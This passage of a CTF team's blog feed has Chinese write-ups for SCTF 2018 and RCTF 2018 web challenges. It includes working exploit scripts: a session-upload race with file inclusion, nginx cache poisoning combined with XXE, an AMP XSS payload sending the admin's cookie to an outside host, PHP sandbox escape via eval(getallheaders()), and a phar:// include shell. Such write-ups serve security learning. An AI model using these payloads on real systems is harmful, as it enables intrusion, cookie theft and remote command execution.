class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://116.62.71.206:52872/?f=login.php'</span></span><br><span class="line">data = &#123;<span class="string">'name'</span>:<span class="string">'admin'</span>,<span class="string">'pass'</span>:<span class="string">'sctf2018_h656cDBkU2'</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url,data = data)</span><br><span class="line">PHPSESSID = r.cookies[<span class="string">'PHPSESSID'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'input the PHPSESSID in include.py'</span> +<span class="string">'\n'</span> + PHPSESSID</span><br><span class="line">time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    url = <span class="string">'http://116.62.71.206:52872/?f=upload_sctf2018_C9f7y48M75.php'</span></span><br><span class="line">    files = &#123; </span><br><span class="line">    <span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> : (<span class="keyword">None</span>,<span class="string">'&lt;?php echo file_get_contents("/tmp/flag_56CcE97QGNxDEXNpW3HY");?&gt;'</span>),  </span><br><span class="line"></span><br><span class="line">    <span class="string">"upload"</span> : (<span class="string">"tmp.jpg"</span>, open(<span class="string">"tmp.png"</span>, <span class="string">"rb"</span>), <span class="string">"image/png"</span>), </span><br><span class="line"></span><br><span class="line">    <span class="string">"submit"</span> : (<span class="keyword">None</span>,<span class="string">"submit"</span>)</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">#proxies = &#123;'http':'http://127.0.0.1:8080'&#125;</span></span><br><span class="line">    headers = &#123;<span class="string">'Cookie'</span>:<span class="string">'PHPSESSID='</span> + PHPSESSID&#125;</span><br><span class="line">    r = requests.post(url,files = files , headers = headers)</span><br><span class="line">    <span class="keyword">print</span> r.text</span><br><span class="line">    <span class="keyword">print</span> PHPSESSID</span><br><span class="line"><span class="comment">#开了cleanup，需要竞争，并且保持回话的session</span></span><br></pre></td></tr></table></figure></p><p>include.py <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">PHPSESSID = <span class="string">'qc2kavokdjiiepu283hduivod2'</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">url = <span class="string">'http://116.62.71.206:52872/?f=aa://../../../../var/lib/php/sessions/sess_'</span> + PHPSESSID</span><br><span class="line"><span class="keyword">print</span> url</span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'SCTF'</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="keyword">print</span> r.text</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><h2><span id="新的建议板">新的建议板</span></h2><p>这题也是赛后做出来的</p><p>Angular JS模板注入 漏洞详情 https://blog.csdn.net/u011721501/article/details/51506364</p><p>留言暗示后台有机器人，所以，构造xss吧</p><p>后台是express，post错误类型参数会报错 suggest里post完马上get也有大概率会报错 login里传错误类型参数直接就保持连接但是没有应答...</p><p>能插入外部js的payload: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">直接开x,读一下源码 发现后台有admin/file, 其中需要提交filepasswd</span><br><span class="line">这时候回到前台,查看假后台的源码 , 　views/admintest2313.html 里面有个memo,其中有请求api/memo/admintest2313,</span><br><span class="line">我们按照名称来请求真正后台的memo, /api/memos/adminClound</span><br><span class="line">会得到filepasswd:HGf^&amp;39NsslUIf^23</span><br><span class="line">再csrf post过去就得到flag了</span><br><span class="line"></span><br><span class="line">![](https://xzfile.aliyuncs.com/media/upload/picture/20180622171314-7e4197e2-75fc-1.png)</span><br><span class="line">&gt; `flag:sctf&#123;T4is_is_flag2313&#125;`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## NGINX的秘密</span><br><span class="line">&gt;hint4:/editxxxxx怎么也能访问?</span><br><span class="line">hint3:路由嘛，扫一扫目录就知道了。views.py是读不出来的233333</span><br><span class="line">hint2:这个路由好生奇怪</span><br><span class="line">hint1:从nginx的典型错误配置入手吧</span><br><span class="line"></span><br><span class="line">这题是赛后以及在wupco师傅指导下做出来的，膜师傅orz</span><br><span class="line">一开始比赛过程中只找到一个XXE，一直想读nginx配置文件读不到，赛后才知道nginx和后端不在同一个环境...</span><br><span class="line"></span><br><span class="line">目标有5个功能点</span><br><span class="line"></span><br><span class="line">``` </span><br><span class="line">    UserInfo</span><br><span class="line">    EditMyinfo</span><br><span class="line">    Write_your_plan</span><br><span class="line">    import_and_export</span><br><span class="line">    Post Bug</span><br></pre></td></tr></table></figure></p><p>访问http://116.62.137.155:4455/user/admin ，看到 &gt;-syc-note 我已经把所有秘密写进secret plan了233333</p><p>推想需要读admin的/write_plan</p><p>发现存在nginx配置不当导致目录穿越漏洞。可以参考https://github.com/vulhub/vulhub/tree/master/nginx/insecure-configuration http://116.62.137.155:4455/static../etc/nginx/nginx.conf 读取nginx配置文件，看到开启了代理缓存： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">proxy_cache_path /tmp/mycache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=30s use_temp_path=off;</span><br><span class="line"></span><br><span class="line">limit_conn_zone $binary_remote_addr zone=conn:10m;</span><br><span class="line">limit_req_zone  $binary_remote_addr zone=allips:10m rate=2r/s;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 4455 default_server;</span><br><span class="line">    server_name localhost;</span><br><span class="line"></span><br><span class="line">    location /static &#123;</span><br><span class="line">        alias /home/;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~* \.(css|js|gif|png)&#123;</span><br><span class="line">        proxy_cache             my_cache;</span><br><span class="line">        proxy_cache_valid       200 30s;</span><br><span class="line">        proxy_pass              http://bugweb.app:8000;</span><br><span class="line">        proxy_set_header        Host $host:$server_port;</span><br><span class="line">        proxy_ignore_headers    Expires Cache-Control Set-Cookie;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        limit_conn conn 10;</span><br><span class="line">        proxy_pass       http://bugweb.app:8000;</span><br><span class="line">        proxy_set_header Host $host:$server_port;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>匹配到~* \.(css|js|gif|png)就进行缓存。</p><p>查看文档http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_cache_path 了解proxy_cache_path的值的含义，得知缓存文件保存在/tmp/mycache，用于定义缓存文件名的proxy_cache_key未设置，则使用默认值 <span class="math inline">\(scheme\)</span>proxy_host<span class="math inline">\(request_uri，即文件名形式为MD5(\)</span>scheme<span class="math inline">\(proxy_host\)</span>request_uri),如果访问http://116.62.137.155:4455/write_plan/a.js/ ，则缓存文件名为MD5(http://bugweb.app:8000/write_plan/a.js/) ==6fcfa7b1e6bad837b70dc98c9b82b43b，由于proxy_cache_path设置了levels=1:2，因此缓存文件存在/tmp/mycache下的两级目录下，第一级目录名取MD5值的最后一个字符，第二级目录名取MD5值的倒数2、3个字符，例如/tmp/mycache/b/43/6fcfa7b1e6bad837b70dc98c9b82b43b，再通过任意文件读取即可读到缓存文件的内容。</p><p>由于路由很奇怪，访问/editxxxxx等同于访问/edit，同理访问/write_planxxxx等同于访问/write_planxxxx。因而构造http://116.62.137.155:4455/write_plan/a.js/ 提交给管理员访问，再读取缓存文件，可以找到ftp的帐号密码syc10ver Eec5TN9fruOOTp2G，再通过http://116.62.137.155:4455/import_and_export/ 的XXE读取/proc/net/arp，发现存在172.18.0.1~4，再通过ftp扫描这四个ip，在172.18.0.4发现文件flag327a6c4304ad5938eaf0efb6cc3e53dc &gt; <code>flag:sctf{Not_0n1y_xx3_but_als0_web_cache}</code> <strong><em>萌新团队, 有兴趣请关注我们的<a href="https://github.com/De1ta-team" target="_blank" rel="noopener">GitHub</a></em></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;de1ta-team&quot;&gt;&lt;strong&gt;De1ta-Team&lt;/strong&gt;&lt;/h1&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://blog.de1ta.com/tags/ctf/"/>
    
      <category term="re" scheme="https://blog.de1ta.com/tags/re/"/>
    
      <category term="web" scheme="https://blog.de1ta.com/tags/web/"/>
    
      <category term="crypto" scheme="https://blog.de1ta.com/tags/crypto/"/>
    
      <category term="pwn" scheme="https://blog.de1ta.com/tags/pwn/"/>
    
      <category term="misc" scheme="https://blog.de1ta.com/tags/misc/"/>
    
      <category term="writeup" scheme="https://blog.de1ta.com/tags/writeup/"/>
    
      <category term="sctf" scheme="https://blog.de1ta.com/tags/sctf/"/>
    
  </entry>
  
  <entry>
    <title>RCTF 2018 Writeup</title>
    <link href="https://blog.de1ta.com/2018/05/22/RCTF-2018-Writeup/"/>
    <id>https://blog.de1ta.com/2018/05/22/RCTF-2018-Writeup/</id>
    <published>2018-05-22T04:56:14.000Z</published>
    <updated>2020-05-07T04:30:01.365Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="de1ta-team"><strong>De1ta-Team</strong></span></h1><a id="more"></a><blockquote><p>Team：De1ta</p></blockquote><!-- toc --><ul><li><a href="#0x00-web">0x00 Web</a><ul><li><a href="#amp"><strong>AMP</strong></a></li><li><a href="#r-cursive"><strong>r-cursive</strong></a></li><li><a href="#backdoor"><strong>backdoor</strong></a></li></ul></li><li><a href="#0x01-misc">0x01 Misc</a><ul><li><a href="#sign"><strong>sign</strong></a></li><li><a href="#git"><strong>git</strong></a></li><li><a href="#cats"><strong>cats</strong></a></li><li><a href="#cats-rev2"><strong>cats Rev.2</strong></a></li><li><a href="#number-game"><strong>Number Game</strong></a></li><li><a href="#520gift"><strong>520gift</strong></a></li></ul></li><li><a href="#0x02-pwn">0x02 Pwn</a><ul><li><a href="#babyheap"><strong>BabyHeap</strong></a></li><li><a href="#simulator"><strong>simulator</strong></a></li><li><a href="#rnote3"><strong>RNote3</strong></a></li><li><a href="#rnote4"><strong>RNote4</strong></a></li><li><a href="#stringer"><strong>stringer</strong></a></li></ul></li><li><a href="#0x03-re">0x03 RE</a><ul><li><a href="#babyre">babyre</a></li><li><a href="#simple-vm">simple vm</a></li><li><a href="#magic">magic</a></li><li><a href="#sql"><strong>sql</strong></a></li><li><a href="#compiler">compiler</a></li><li><a href="#simple-re">simple re</a></li><li><a href="#babyre2"><strong>babyre2</strong></a></li></ul></li><li><a href="#0x04-crypto">0x04 Crypto</a><ul><li><a href="#cpushop"><strong>cpushop</strong></a></li><li><a href="#ecdh"><strong>ECDH</strong></a></li></ul></li></ul><!-- tocstop --><h2><span id="0x00-web">0x00 Web</span></h2><h3><span id="amp"><strong>AMP</strong></span></h3><p>由cookie提示flag在admin的cookie 应该是xss</p><p>post后会log</p><p>应该和amp标准有关 : <a href="https://zh.wikipedia.org/zh-hans/Accelerated_Mobile_Pages" class="uri" target="_blank" rel="noopener">https://zh.wikipedia.org/zh-hans/Accelerated_Mobile_Pages</a></p><p>AMP规范 : <a href="https://www.ampproject.org/zh_cn/docs/fundamentals/spec" class="uri" target="_blank" rel="noopener">https://www.ampproject.org/zh_cn/docs/fundamentals/spec</a></p><p>猜测使用AMP特性绕过csp打到cookie</p><p>AMP获取cookies的方法：<a href="https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md#client-id" class="uri" target="_blank" rel="noopener">https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md#client-id</a></p><p>网页源码里有句注释：</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/760ee8a7498c23022ab69809be19f350.png?raw=true"></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;amp-pixel src=&quot;https://487a72b5.2m1.pw/?cid=CLIENT_ID(FLAG)&quot;&gt;&lt;/amp-pixel&gt;</span><br><span class="line"></span><br><span class="line">&lt;amp-user-notification</span><br><span class="line">    layout=nodisplay</span><br><span class="line">    id=&quot;FLAG&quot;</span><br><span class="line">    data-show-if-href=&quot;https://487a72b5.2m1.pw&quot;</span><br><span class="line">    data-dismiss-href=&quot;https://487a72b5.2m1.pw&quot;&gt;</span><br><span class="line">    This site uses cookies to personalize content.</span><br><span class="line">    &lt; a href=&quot;&quot;&gt;Learn more.&lt;/ a&gt;</span><br><span class="line">   &lt;button on=&quot;tap:user-consent.dismiss&quot;&gt;I accept&lt;/button&gt;</span><br><span class="line">&lt;/amp-user-notification&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Client ID is not provided until `user-consent` is dismissed --&gt;</span><br><span class="line">&lt;amp-pixel src=&quot;https://487a72b5.2m1.pw/?cid=CLIENT_ID(FLAG,FLAG)&quot;&gt;&lt;/amp-pixel&gt;</span><br></pre></td></tr></table></figure><p>url编码后在浏览器触发</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/a26beb18454f4b40d6bd8391dae8d5a1.png?raw=true"></p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/97c5792c45546fe10532ccf70f935943.png?raw=true"></p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/84dd60c8ffb92776a7f112d911c36d08.png?raw=true"></p><p>flag: <strong>RCTF{El_PsY_CONGRO0_sg0}</strong></p><h3><span id="r-cursive"><strong>r-cursive</strong></span></h3><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/78ad9d62e5596eb6437600cdc75d8ff0.png?raw=true"></p><p>访问后在../sandbox/生成一个sha1文件夹，然后复制模板进去，提供了重定向到该文件夹和重置文件夹的功能</p><p>重定向后是个php沙箱，只能执行格式为`xxxx();`的函数</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/ffda1904ef97da4ac5b93ffae77fa012.png?raw=true"></p><p>可以递归执行函数，不允许带参数</p><p>?cmd=print(readdir(opendir(getcwd()))); 可以列目录</p><p>?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件</p><p>?cmd=print(dirname(dirname(getcwd()))); print出/var/www</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/889f9bb358752e2f517d7eb81c180ea4.png?raw=true"></p><p>翻阅文档找到`getallheaders()`函数，会返回所有的http请求头，因为header可控，所以可执行任意命令了</p><p>?cmd=print(implode(getallheaders()));</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/7b3e433d271b2b45cae7a14a0f6550b7.png?raw=true"> 命令执行： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /?cmd=eval(implode(getallheaders())); HTTP/1.1</span><br><span class="line">cmd: phpinfo(); //</span><br><span class="line">Host: 39093088bf9a9d33d5dd5b973cc1232e2145ee49.sandbox.r-cursive.ml</span><br></pre></td></tr></table></figure></p><p>接下来沙盒逃逸，从phpinfo看，这里是开了mod_vhost_alias</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/b3f8d9fc78e8b40f8e02552ff83787bd.png?raw=true"></p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/74ed6f2b957dd1d98e94d086ced9f666.png?raw=true"></p><p>这里是利用auto_prepend来载入sandbox下的init.php来设置沙盒的open_basedir</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/3a3e13992efd1293cc6e1ab93e8c1572.png?raw=true"></p><p>所以这里通过修改host来逃逸沙盒的open_basedir。</p><ol type="1"><li>正常的open_basedir: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /?cmd=eval(implode(getallheaders())); HTTP/1.1</span><br><span class="line">cmd: echo ini_get(&apos;open_basedir&apos;);//</span><br><span class="line">Host: 39093088bf9a9d33d5dd5b973cc1232e2145ee49.sandbox.r-cursive.ml</span><br><span class="line">Content-Length: 4</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/0f08b6d227e6337fead817c1a75e10a6.png?raw=true"></p><ol start="2" type="1"><li>把host头的39093088bf9a9d33d5dd5b973cc1232e2145ee49.sandbox去掉： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /?cmd=eval(implode(getallheaders())); HTTP/1.1</span><br><span class="line">cmd: echo ini_get(&apos;open_basedir&apos;);//</span><br><span class="line">Host: .r-cursive.ml</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/d41f6a1b0ac52577813f63286f1af623.png?raw=true"></p><p>403是因为webroot没有index.php，正好说明已经逃逸出了沙盒</p><p>所以去访问39093088bf9a9d33d5dd5b973cc1232e2145ee49/index.php 即可调用命令</p><ol start="3" type="1"><li>借用39093088bf9a9d33d5dd5b973cc1232e2145ee49/index.php来执行命令： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /39093088bf9a9d33d5dd5b973cc1232e2145ee49/index.php?cmd=eval(implode(getallheaders())); HTTP/1.1</span><br><span class="line">cmd: echo ini_get(&apos;open_basedir&apos;);//</span><br><span class="line">Host:  .r-cursive.ml</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/5d6fb4e3487f7aa4cc3a876e82a39320.png?raw=true"></p><ol start="4" type="1"><li>拿到flag <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /39093088bf9a9d33d5dd5b973cc1232e2145ee49/index.php?cmd=eval(implode(getallheaders())); HTTP/1.1</span><br><span class="line">cmd: echo ini_get(&apos;open_basedir&apos;);$myfile=fopen(&apos;/var/www/sandbox/init.php&apos;,&apos;r&apos;);echo fread($myfile,9999);//</span><br><span class="line">Host:  .r-cursive.ml</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/d5d703f98cdee96a54d3036d6f9f6950.png?raw=true"></p><h3><span id="backdoor"><strong>backdoor</strong></span></h3><p>题目的附件在RE 的complier</p><p>解压出来是一个archlinux的ISO,直接扔进vmware启动就行</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/05685d7633fa0a02851757688308b94f.png?raw=true"></p><p>/root文件夹下有helloworld.c和wallpaper.jpg两个文件，图片提取出来一个no_hint.txt：</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/6d5451c2628949500e6e02b755e23ba0.png?raw=true"></p><p>用wireshark抓取虚拟机用gcc编译时的流量，发现会从<a href="http://backdoor.2018.teamrois.cn/control.sh" class="uri" target="_blank" rel="noopener">http://backdoor.2018.teamrois.cn/control.sh</a> 下载了一个bash脚本：</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/4eba6e0f66030a74c25104d69c3c4600.png?raw=true"></p><p>该脚本的主要工作为：</p><blockquote><ol type="1"><li>检测是否有wireshark|tshark|idaq|strace|gdb|edb|lldb|lida|hopper|r2|radare2进程，如果有，就向http://backdoor.2018.teamrois.cn/post.php?action=debugging&amp;count=$debuggers发送“Oh, no! He's debugging! I'll kill them!!!!!!”，并杀死相关进程；</li><li>执行head -c100000 /dev/urandom &gt; /tmp/random.txt 命令，将/tmp/random.txt打包为zip并发送给<a href="http://backdoor.2018.teamrois.cn/post.php?action=upload" class="uri" target="_blank" rel="noopener">http://backdoor.2018.teamrois.cn/post.php?action=upload</a></li><li>echo "Did you find the backdoor?" &gt; ~/rctf-backdoor.txt</li></ol></blockquote><p>访问<a href="http://backdoor.2018.teamrois.cn/" class="uri" target="_blank" rel="noopener">http://backdoor.2018.teamrois.cn/</a>：</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/1d44043e8848151b3ec1306810a3f0e4.png?raw=true"></p><p>查看源代码，有一段aaencode</p><p>解码得到到</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.loginform.onsubmit = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123; </span><br><span class="line">e.preventDefault()</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'wp-submit'</span>).disabled = <span class="string">'disabled'</span></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'wp-submit'</span>).removeAttribute(<span class="string">'disabled'</span>)</span><br><span class="line">alert(<span class="string">'Login failed'</span>)</span><br><span class="line"><span class="string">"What? Need hint?"</span></span><br><span class="line"><span class="string">"index.php is a hint!"</span></span><br><span class="line">&#125;, <span class="number">3000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>意识到这个登陆页没啥用</p><p>在<a href="http://backdoor.2018.teamrois.cn/post.php?action=upload" class="uri" target="_blank" rel="noopener">http://backdoor.2018.teamrois.cn/post.php?action=upload</a> 寻找突破口，发现可以文件读取</p><p>读post.php源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=post</span><br></pre></td></tr></table></figure><p>post.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> $_GET[<span class="string">'action'</span>] . <span class="string">'.php'</span>;</span><br></pre></td></tr></table></figure><p>读upload.php源码</p><p><a href="http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=upload" class="uri" target="_blank" rel="noopener">http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=upload</a></p><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) <span class="keyword">exit</span>;</span><br><span class="line">$file = $_FILES[<span class="string">'file'</span>];</span><br><span class="line">$zip = <span class="keyword">new</span> ZipArchive();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">true</span> !== $zip-&gt;open($file[<span class="string">'tmp_name'</span>])) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'No a valid zip'</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">false</span> === $zip-&gt;getFromName(<span class="string">'tmp/random.txt'</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'No file'</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dest = <span class="string">'uploads/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) . hash(<span class="string">'sha256'</span>, file_get_contents($file[<span class="string">'tmp_name'</span>])) . <span class="string">'.zip'</span>;</span><br><span class="line">move_uploaded_file($file[<span class="string">'tmp_name'</span>], $dest);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Saved into '</span> . $dest;</span><br></pre></td></tr></table></figure><p>post.php存在限制后缀的文件包含，可以通过phar://或者zip://协议绕过，从而包含恶意代码getshell，upload.php中限制了上传的文件要是个zip并且里面要有个random.txt文件，最终构造exp如下</p><p>exp.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s1 = <span class="string">"Saved into "</span></span><br><span class="line">post_url = <span class="string">"http://backdoor.2018.teamrois.cn/post.php?action=upload"</span></span><br><span class="line"></span><br><span class="line">zip_file = open(<span class="string">"tmp.zip"</span>,<span class="string">"rb"</span>)</span><br><span class="line">upload_file = &#123;<span class="string">'file'</span>:zip_file&#125;</span><br><span class="line">r = requests.post(post_url,files=upload_file)</span><br><span class="line">dest = r.text[len(s1):]</span><br><span class="line">print(dest)</span><br><span class="line"></span><br><span class="line">shell_url = <span class="string">"http://backdoor.2018.teamrois.cn/post.php?action=phar://"</span>+ dest + <span class="string">"/evil"</span></span><br><span class="line"></span><br><span class="line">print(shell_url)</span><br><span class="line">command = input(<span class="string">"command: "</span>)</span><br><span class="line">payload = &#123;<span class="string">'chybeta'</span>: <span class="string">'system("cat flag_HIDINGANDSEEKlol.php");'</span>&#125;</span><br><span class="line">r = requests.get(shell_url,params=payload)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h2><span id="0x01-misc">0x01 Misc</span></h2><h3><span id="sign"><strong>sign</strong></span></h3><p>elf文件，binwalk一下有发现，binwalk提取出其中的png文件，是这样的：</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/78f44c6ceef4210e4e54652aeecddc48.png?raw=true"></p><p>提示wine</p><p>用wine运行getflag：</p><p><img src="https://github.com/De1ta-team/De1ta-team.github.io/blob/master/img/20180522/media/86ffcf812287db1c3f9149940ca62976.png?raw=true"></p><h3><span id="git"><strong>git</strong></span></h3><p>给了个git文件夹，估计flag是藏在提交历史里，</p><p>getflag：</p><p><img 